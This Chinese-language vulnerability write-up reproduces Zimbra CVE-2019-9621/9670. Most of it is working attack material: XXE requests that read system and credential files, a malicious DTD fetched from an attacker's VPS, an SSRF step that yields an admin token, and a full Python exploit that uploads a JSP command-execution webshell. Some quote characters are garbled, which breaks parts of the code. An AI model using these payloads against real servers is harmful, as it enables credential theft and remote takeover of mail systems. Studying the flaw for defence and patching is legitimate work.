---
title: "（CVE-2019-9621）Zimbra 远程代码执行漏洞"
id: zhfly3310
---

# （CVE-2019-9621）（CVE-2019-9670）Zimbra 远程代码执行漏洞

## 一、漏洞简介

当 Zimbra 存在像任意文件读取、XXE（xml外部实体注入）这种漏洞时，攻击者可以利用此漏洞读取 localconfig.xml配置文件，获取到 zimbra admin ldap password，并通过 7071 admin 端口进行 SOAP AuthRequest 认证，得到 admin authtoken漏洞是利用XXE和ProxyServlet SSRF 漏洞拿到 admin authtoken 后，通过文件上传在服务端执行任意代码，威胁程度极高。当Zimbra服务端打来Memcached缓存服务是，可以利用SSRF攻击进行反序列化执行远程代码。不过由于Zimbra在单服务器安装中尽管Memcached虽然启动但是并没有进行使用，所以其攻击场景受到限制。

## 二、漏洞影响

ZimbraCollaboration Server 8.8.11 之前的版本都受到影响。具体来说：

*   Zimbra < 8.7.11 版本中，攻击者可以在无需登录的情况下，实现远程代码执行。
*   Zimbra < 8.8.11 版本中，在服务端使用 Memcached 做缓存的情况下，经过登录认证后的攻击者可以实现远程代码执行。

## 三、复现过程

### 第一步：检测是否存在xxe漏洞

```
POST /Autodiscover/Autodiscover.xml HTTP/1.1  
Host: www.0-sec.org  
User-Agent: Mozilla/5.0 (Windows NT 10.0;) Gecko/20100101 Firefox/66.0  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8  
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.2  
Accept-Encoding: gzip, deflate  
Referer: https://mail.****.com/zimbra/  
Content-Type: application/soap+xml  
Content-Length: 436  
Connection: close  
Cookie: ZM_TEST=true  
Upgrade-Insecure-Requests: 1 `<!DOCTYPE xxe [

<!ELEMENT name ANY >

<!ENTITY xxe SYSTEM “file:///etc/passwd” >]>

<Autodiscover xmlns=“[http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a](http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a)”>

<Request>

<EMailAddress>aaaaa</EMailAddress>

<AcceptableResponseSchema>&xxe;</AcceptableResponseSchema>

</Request>

</Autodiscover>` 
```

![1.png](../img/2c694de18e5148be2bb64cf68236ac91.png)

### 第二步：读取zimbra用户账号密码

> dtd文件内容如下：

```
<!ENTITY % file SYSTEM "file:../conf/localconfig.xml">  
<!ENTITY % start "<![CDATA["> 
<!ENTITY % end "]]>">  
<!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>"> 
```

> POST请求包如下：

```
POST /Autodiscover/Autodiscover.xml HTTP/1.1  
Host: www.0-sec.org  
User-Agent: Mozilla/5.0 (Windows NT 10.0;) Gecko/20100101 Firefox/66.0  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8  
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.2  
Accept-Encoding: gzip, deflate  
Referer: https://mail.****.com/zimbra/  
Content-Type: application/soap+xml  
Content-Length: 436  
Connection: close  
Cookie: ZM_TEST=true  
Upgrade-Insecure-Requests: 1 `<!DOCTYPE Autodiscover [

<!ENTITY % dtd SYSTEM “[http://www.0-sec.org/dtd](http://www.0-sec.org/dtd)”>

%dtd;

%all;

]>

<Autodiscover xmlns=“[http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a](http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a)”>

<Request>

<EMailAddress>aaaaa</EMailAddress>

<AcceptableResponseSchema>&fileContents;</AcceptableResponseSchema>

</Request>

</Autodiscover>` 
```

![image](../img/1d9a49f8e73cb88eb609e98bdfbfade0.png)

这里利用了CVE-2019-9670漏洞来读取配置文件，你需要在自己的VPS服务器上放置一个dtd文件，并使该文件能够通过HTTP访问。为了演示，我在GitHub上创建了一个仓库，从GitHub上获取dtd文件。

上图中用红框圈起来的就是zimbra账号的密码

### 第三步：获取低权限token

> POST请求包如下：

```
POST /service/soap HTTP/1.1  
Host: www.0-sec.org  
User-Agent: Mozilla/5.0 (Windows NT 10.0) Gecko/20100101 Firefox/66.0  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8  
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.2  
Accept-Encoding: gzip, deflate  
Referer: https://mail.****.com/zimbra/  
Content-Type: application/soap+xml  
Content-Length: 467  
Connection: close  
Cookie: ZM_TEST=true  
Upgrade-Insecure-Requests: 1 `<soap:Envelope xmlns:soap=“[http://www.w3.org/2003/05/soap-envelope](http://www.w3.org/2003/05/soap-envelope)”>

<soap:Header>

<context xmlns=“urn:zimbra”>

<userAgent name=“ZimbraWebClient” version=“5.0.15_GA_2851”/>

</context>

</soap:Header>

<soap:Body>

<AuthRequest xmlns=“urn:zimbraAccount”>

<account by=“adminName”>zimbra</account>

<password>上面得到的密码</password>

</AuthRequest>

</soap:Body>

</soap:Envelope>` 
```

![image](../img/3048ef2bbbba3f214dfbde47fc6aacc3.png)

从上图可以看到已经获取到token，但该token不是管理员权限的token，暂时记下来以后要用。

### 第四步：利用SSRF漏洞通过proxy接口，访问admin的soap接口获取高权限Token

> POST请求包如下：

```
POST /service/proxy?target=https://127.0.0.1:7071/service/admin/soap HTTP/1.1  
Host: www.0-sec.org:7071  
User-Agent: Mozilla/5.0 (Windows NT 10.0) Gecko/20100101 Firefox/66.0  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8  
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.2  
Accept-Encoding: gzip, deflate  
Referer: https://mail.****.com/zimbra/
Content-Type: application/soap+xml  
Content-Length: 465  
Connection: close  
Cookie: ZM_ADMIN_AUTH_TOKEN=0_5221766f264e4dcb78b4f67be5f839b1ed668da3_69643d33363a65306661666438392d313336302d313164392d383636312d3030306139356439386566323b6578703d31333a313535343733303133353638333b747970653d363a7a696d6272613b7469643d393a3735353034333637323b  
Upgrade-Insecure-Requests: 1 `<soap:Envelope xmlns:soap=“[http://www.w3.org/2003/05/soap-envelope](http://www.w3.org/2003/05/soap-envelope)”>

<soap:Header>

<context xmlns=“urn:zimbra”>

<userAgent name=“ZimbraWebClient - SAF3 (Win)” version=“5.0.15_GA_2851”/>

</context>

</soap:Header>

<soap:Body>

<AuthRequest xmlns=“urn:zimbraAdmin”>

<account by=“adminName”>zimbra</account>

<password>GzXaU76_s5</password>

</AuthRequest>

</soap:Body>

</soap:Envelope>` 
```

![image](../img/e04c23036ae83d797fca29c224aa5a4b.png)

Cookie中设置`Key为ZM_ADMIN_AUTH_TOKEN`，值为上面请求所获取的token，将`xmlns="urn:zimbraAccount"`修改为`xmlns="urn:zimbraAdmin"`，在Host字段末尾添加“:7071”，URL中的target要使用https协议。然后发送请求即可获得admin权限的token。

### 第五步：利用高权限token传文件getshell

![image](../img/4bd9ac0cfcad91471ea6008d62eb636f.png)

将上一步获取的admin权限token添加到cookie中，然后上传webshell。

Webshell路径为/downloads/k4x6p.jsp，访问该webshell时需要在cookie中添加admin_toke。

你可以利用此webshell在其他无需cookie即可访问的目录里创建一个可用菜刀连接的小马。

![image](../img/3271f5c5d5259c08d367b2d15ac432c7.png)

**简易poc**

```
import requests `file= {

‘filename1’:(None,“whocare”,None),

‘clientFile’:(“sunian.jsp”,r’<%if(“023”.equals(request.getParameter(“pwd”))){java.io.InputStream in=Runtime.getRuntime().exec(request.getParameter(“i”)).getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while((a=in.read(b))!=-1){out.println(new String(b));}out.print("</pre>");}%>’,“text/plain”),

‘requestId’:(None,“12”,None),

}

headers ={

“Cookie”:“ZM_ADMIN_AUTH_TOKEN=0_eb68a2a147c98c6d0c2257d7638c4f1256493b28_69643d33363a65306661666438392d313336302d313164392d383636312d3030306139356439386566323b6578703d31333a313539323733343831303035313b61646d696e3d313a313b747970653d363a7a696d6272613b7469643d393a3433323433373532323b”,#改成自己的admin_token

“Host”:“foo:7071”

}

r=requests.post(“[https://192.168.37.137:7071/service/extension/clientUploader/upload](https://192.168.37.137:7071/service/extension/clientUploader/upload)”,files=file,headers=headers,verify=False)

print(r.text)` 
```

![2.png](../img/d2f468ed1b2120f405e0a506089b4940.png)

> 虽然执行报错了，但是不影响
> shell地址：https://www.0-sec.org:7071/downloads/sunian.jsp

![3.png](../img/ccba9399e7f2b9e1f7ae14b6a0b65962.png)

### 完整版exp

![4.png](../img/58aca7f55ea5f43bed975fd39f0fb0f1.png)

```
#coding=utf8
import requests
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
base_url=sys.argv[1]
base_url=base_url.rstrip("/")
#利用request模块来发包和接受数据，sys模块用来传参，并删除最右侧的/斜杠

filename = “sunian.jsp”

fileContent = r’<%if(“023”.equals(request.getParameter(“pwd”))){java.io.InputStream in=Runtime.getRuntime().exec(request.getParameter(“i”)).getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while((a=in.read(b))!=-1){out.println(new String(b));}out.print("</pre>");}%>’

#fileContent = r’<%@page import=“[java.io](http://java.io).*”%><%@page import=“sun.misc.BASE64Decoder”%><%try {String cmd = request.getParameter(“tom”);String path=application.getRealPath(request.getRequestURI());String dir=“weblogic”;if(cmd.equals(“NzU1Ng”)){out.print("[S]"+dir+"[E]");}byte[] binary = BASE64Decoder.class.newInstance().decodeBuffer(cmd);String xxcmd = new String(binary);Process child = Runtime.getRuntime().exec(xxcmd);InputStream in = child.getInputStream();out.print("->|");int c;while ((c = in.read()) != -1) {out.print((char)c);}in.close();out.print("|<-");try {child.waitFor();} catch (InterruptedException e) {e.printStackTrace();}} catch (IOException e) {System.err.println(e);}%>’

#可使用第11行bypass

print(base_url)

#请自己在公网放置dtd文件

dtd_url=“[http://VPS-IP/exp.dtd](http://VPS-IP/exp.dtd)”

“”"

<!ENTITY % file SYSTEM “file:…/conf/localconfig.xml”>

<!ENTITY % start “<![CDATA[”>

<!ENTITY % end “]]>”>

<!ENTITY % all “<!ENTITY fileContents ‘%start;%file;%end;’>”>

“”"

xxe_data = r"""<!DOCTYPE Autodiscover [

<!ENTITY % dtd SYSTEM “{dtd}”>

%dtd;

%all;

]>

<Autodiscover xmlns=“[http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a](http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a)”>

<Request>

<EMailAddress>aaaaa</EMailAddress>

<AcceptableResponseSchema>&fileContents;</AcceptableResponseSchema>

</Request>

</Autodiscover>""".format(dtd=dtd_url)

#XXE stage

headers = {

“Content-Type”:“application/xml”

}

print("[*] Get User Name/Password By XXE “)

r = requests.post(base_url+”/Autodiscover/Autodiscover.xml",data=xxe_data,headers=headers,verify=False,timeout=15)

#print r.text

if ‘response schema not available’ not in r.text:

print(“don’t have xxe”)

exit()

#low_token Stage

import re

pattern_name = re.compile(r"&lt;key name=("|&quot;)zimbra_user("|&quot;)&gt;\n.*?&lt;value&gt;(.*?)&lt;/value&gt;")

pattern_password = re.compile(r"&lt;key name=("|&quot;)zimbra_ldap_password("|&quot;)&gt;\n.*?&lt;value&gt;(.*?)&lt;/value&gt;")

username = pattern_name.findall(r.text)[0][2]

password = pattern_password.findall(r.text)[0][2]

#print(username)

#print(password)

auth_body="""<soap:Envelope xmlns:soap=“[http://www.w3.org/2003/05/soap-envelope](http://www.w3.org/2003/05/soap-envelope)”>

<soap:Header>

<context xmlns=“urn:zimbra”>

<userAgent name=“ZimbraWebClient - SAF3 (Win)” version=“5.0.15_GA_2851.RHEL5_64”/>

</context>

</soap:Header>

<soap:Body>

<AuthRequest xmlns="{xmlns}">

<account by=“adminName”>{username}</account>

<password>{password}</password>

</AuthRequest>

</soap:Body>

</soap:Envelope>

“”"

#print("[*] Get Low Privilege Auth Token")

#72行路径可能为/service/soap

r=requests.post(base_url+"/service/admin/soap",data=auth_body.format(xmlns=“urn:zimbraAccount”,username=username,password=password),verify=False)

pattern_auth_token=re.compile(r"<authToken>(.*?)</authToken>")

low_priv_token = pattern_auth_token.findall(r.text)[0]

#print(low_priv_token)

# SSRF+Get Admin_Token Stage

headers[“Cookie”]=“ZM_ADMIN_AUTH_TOKEN=”+low_priv_token+";"

headers[“Host”]=“foo:7071”

#print("[*] Get Admin  Auth Token By SSRF")

#r = requests.post(base_url+"/service/proxy?target=https://127.0.0.1:7071/service/admin/soap",data=auth_body.format(xmlns=“urn:zimbraAdmin”,username=username,password=password),headers=headers,verify=False)

r = requests.post(base_url+"/service/admin/soap",data=auth_body.format(xmlns=“urn:zimbraAdmin”,username=username,password=password),headers=headers,verify=False)

#若86行无法使用请使用85行

admin_token =pattern_auth_token.findall(r.text)[0]

#print(“ADMIN_TOKEN:”+admin_token)

f = {

‘filename1’:(None,“whocare”,None),

‘clientFile’:(filename,fileContent,“text/plain”),

‘requestId’:(None,“12”,None),

}

headers ={

“Cookie”:“ZM_ADMIN_AUTH_TOKEN=”+admin_token

}

print("[*] 木马地址")

r = requests.post(base_url+"/service/extension/clientUploader/upload",files=f,headers=headers,verify=False)

#print(r.text)

print(base_url+"/downloads/"+filename) `#print("[*] Request Result:")

s = requests.session()

r = s.get(base_url+"/downloads/"+filename,verify=False,headers=headers)

#print(r.text)

print("[*] 管理员cookie")

print(headers[‘Cookie’])` 
```

## 参考链接

> https://www.cnblogs.com/dgjnszf/p/10793604.html

> https://xz.aliyun.com/t/7991#toc-1